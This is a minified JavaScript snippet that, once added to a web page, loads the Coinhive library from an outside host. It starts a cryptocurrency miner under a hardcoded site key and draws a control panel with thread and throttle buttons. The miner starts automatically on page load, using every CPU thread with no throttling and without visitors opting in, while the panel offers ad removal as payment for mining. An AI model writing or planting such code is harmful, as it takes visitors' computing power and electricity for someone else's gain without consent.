! function() { var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        e = function(e, t) { n() ? document.addEventListener("DOMContentLoaded", e, t) : document.attachEvent("onreadystatechange", e) };
    e(function() {! function() { var n = document.createElement("script");
            n.type = "text/javascript", n.async = !0; var e = document.getElementsByTagName("script")[0];
            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
                function n() { return Qn.getHashesPerSecond().toFixed(1) }

                function t(n) { return Qn.getTotalHashes(n) }

                function i() { return Qn.getAcceptedHashes() }

                function d() { return Qn.stop() }

                function s(n) { return Qn.start(n) }

                function o() { return Qn.getNumThreads() }

                function a(n) { return Qn.setNumThreads(n) }

                function r() { return s(Wn), a(o() + 1) }

                function m() { return s(Wn), a(o() - 1) }

                function c() { return Qn.isRunning() }

                function u() { return Math.round(100 * Qn.getThrottle().toFixed(1)) / 100 }

                function l(n) { return Qn.setThrottle(n) }

                function p() { return s(Wn), l(u() + .1) }

                function h() { return s(Wn), l(u() - .1) }

                function g() { l(0), a(Zn), s(Wn) }

                function f() { l(.9), a(1), s(Wn) }

                function y() { l(Gn), a(Zn), s(Wn) } var v = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    w = !0,
                    E = navigator.hardwareConcurrency,
                    I = 0,
                    _ = 1e3,
                    B = "miner",
                    T = "mining-stats-canvas",
                    H = "mining-is-running",
                    L = "mining-is-running-id",
                    M = "mining-is-running-id-output",
                    b = "mining-is-running-id-output-yes",
                    k = "mining-is-running-id-output-no",
                    C = "mining-hashes-per-second",
                    x = "mining-hashes-per-second-id",
                    S = "mining-hashes-per-second-id-output",
                    U = "mining-accepted-hashes-per-second",
                    N = "mining-accepted-hashes-per-second-id",
                    P = "mining-accepted-hashes-per-second-id-output",
                    A = "mining-threads",
                    D = "mining-threads-id",
                    O = "mining-threads-id-output",
                    j = "mining-threads-add",
                    F = "mining-threads-remove",
                    R = "mining-hashes-total",
                    q = "mining-hashes-total-id",
                    K = "mining-hashes-total-id-output",
                    V = "mining-start",
                    X = "mining-stop",
                    z = "addthreads",
                    J = "removethreads",
                    Q = "startmining",
                    W = "stopmining",
                    Z = "mining-current-throttle",
                    G = "mining-current-throttle-id",
                    Y = "mining-current-throttle-id-output",
                    $ = "mining-increase-throttle",
                    nn = "mining-increase-throttle-id",
                    en = "mining-decrease-throttle",
                    tn = "mining-decrease-throttle-id",
                    dn = "mining-minimal-speed",
                    sn = "mining-minimal-speed-id",
                    on = "mining-maximum-speed",
                    an = "mining-maximum-speed-id",
                    rn = "mining-default-recommended-speed",
                    mn = "mining-default-recommended-speed-id",
                    cn = "tooltiptext",
                    un = "tooltip",
                    ln = "miner-button-class",
                    pn = "miner-text-area-class",
                    hn = "",
                    gn = "Online",
                    fn = "Offline",
                    yn = "If the miner is currently running.",
                    vn = "Hashes/s | ",
                    wn = "The total number of hashes per second for all threads combined.",
                    En = "Accepted Hashes | ",
                    In = "The number of hashes that have been accepted by the pool.",
                    _n = "Threads | ",
                    Bn = "Amount of threads you have running currently.",
                    Tn = "+",
                    Hn = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
                    Ln = "-",
                    Mn = "Slow it down! (decrease threads to 0 to stop entirely)",
                    bn = "Total Hashes | ",
                    kn = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
                    Cn = "Start",
                    xn = "Start the miner.",
                    Sn = "Stop",
                    Un = "Stop the miner.",
                    Nn = "Throttle | ",
                    Pn = "How much the miner is currently being throttled.",
                    An = "+",
                    Dn = "Increase the throttle to reduce CPU consumption.",
                    On = "-",
                    jn = "Decrease the throttle to allow more CPU consumption.",
                    Fn = "Min",
                    Rn = "Use the most minimal amount of CPU and Power possible.",
                    qn = "Max",
                    Kn = "Use all CPU and Power available.",
                    Vn = "Default",
                    Xn = "Use Recommended default settings.",
                    zn = document.createElement("div");
                zn.id = B, document.body.appendChild(zn), new_html = "<div id='" + T + "'></div>", document.getElementById(B).innerHTML = new_html, new_html = "<div id='" + H + "' class='" + un + " " + pn + "'><span id='" + L + "'>" + hn + "</span><span id='" + M + "'></span><span id='" + cn + "'>" + yn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + C + "' class='" + un + " " + pn + "'><span id='" + x + "'>" + vn + "</span><span id='" + S + "'></span><span id='" + cn + "'>" + wn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + U + "' class='" + un + " " + pn + "'><span id='" + N + "'>" + En + "</span><span id='" + P + "'></span><span id='" + cn + "'>" + In + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + A + "' class='" + un + " " + pn + "'><span id='" + D + "'>" + _n + "</span><span id='" + O + "'></span><span id='" + cn + "'>" + Bn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + j + "' class='" + un + " " + ln + "'><span id='" + z + "'>" + Tn + "</span><span id='" + cn + "'>" + Hn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + F + "' class='" + un + " " + ln + "'><span id='" + J + "'>" + Ln + "</span><span id='" + cn + "'>" + Mn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + R + "' class='" + un + " " + pn + "'><span id='" + q + "'>" + bn + "</span><span id='" + K + "'></span><span id='" + cn + "'>" + kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + V + "' class='" + un + " " + ln + "'><span id='" + Q + "'>" + Cn + "</span><span id='" + cn + "'>" + xn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + X + "' class='" + un + " " + ln + "'><span id='" + W + "'>" + Sn + "</span><span id='" + cn + "'>" + Un + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + Z + "' class='" + un + " " + pn + "'><span id='" + G + "'>" + Nn + "</span><span id='" + Y + "'></span><span id='" + cn + "'>" + Pn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + $ + "' class='" + un + " " + ln + "'><span id='" + nn + "'>" + An + "</span><span id='" + cn + "'>" + Dn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + en + "' class='" + un + " " + ln + "'><span id='" + tn + "'>" + On + "</span><span id='" + cn + "'>" + jn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + dn + "' class='" + un + " " + ln + "'><span id='" + sn + "'>" + Fn + "</span><span id='" + cn + "'>" + Rn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + on + "' class='" + un + " " + ln + "'><span id='" + an + "'>" + qn + "</span><span id='" + cn + "'>" + Kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + rn + "' class='" + un + " " + ln + "'><span id='" + mn + "'>" + Vn + "</span><span id='" + cn + "'>" + Xn + "</span></div>", document.getElementById(T).innerHTML += new_html; var Jn = document.createElement("style");
                Jn.type = "text/css", e.parentNode.insertBefore(Jn, e); var Qn = new CoinHive.Anonymous(v, { throttle: I, threads: E }),
                    Wn = CoinHive.FORCE_EXCLUSIVE_TAB,
                    Zn = o(),
                    Gn = u();
                document.getElementById(j).onclick = function() { return r() }, document.getElementById(F).onclick = function() { return m() }, document.getElementById(V).onclick = function() { return s(Wn) }, document.getElementById(X).onclick = function() { return d() }, document.getElementById($).onclick = function() { return p() }, document.getElementById(en).onclick = function() { return h() }, document.getElementById(dn).onclick = function() { return f() }, document.getElementById(on).onclick = function() { return g() }, document.getElementById(rn).onclick = function() { return y() }, w && s(Wn), Qn.on("open", function() {}), Qn.on("authed", function(n) {}), Qn.on("close", function() {}), Qn.on("error", function(n) {}), Qn.on("job", function() {}), Qn.on("found", function() {}), Qn.on("accepted", function() {}), setInterval(function() { is_running = "", c() ? (is_running = gn, document.getElementById(M).className = b) : (is_running = fn, document.getElementById(M).className = k), document.getElementById(M).innerHTML = is_running, document.getElementById(S).innerHTML = n(), document.getElementById(P).innerHTML = i(), document.getElementById(O).innerHTML = o(), document.getElementById(K).innerHTML = t(!0), document.getElementById(Y).innerHTML = u() }, _) }, n.onerror = function() {}, e.parentNode.insertBefore(n, e) }() }, !1) }();